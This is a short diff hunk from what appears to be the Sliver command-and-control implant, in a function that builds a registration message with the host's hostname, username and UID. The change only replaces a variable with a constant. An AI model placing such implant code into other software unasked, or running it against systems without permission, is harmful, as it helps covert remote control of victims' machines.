@@ -78,7 +78,7 @@ func getRegisterSliver() *pb.Envelope {
 	hostname, _ := os.Hostname()
 	currentUser, _ := user.Current()
 	data, _ := proto.Marshal(&pb.Register{
-		Name:     sliverName,
+		Name:     consts.SliverName,
 		Hostname: hostname,
 		Username: currentUser.Username,
 		Uid:      currentUser.Uid,
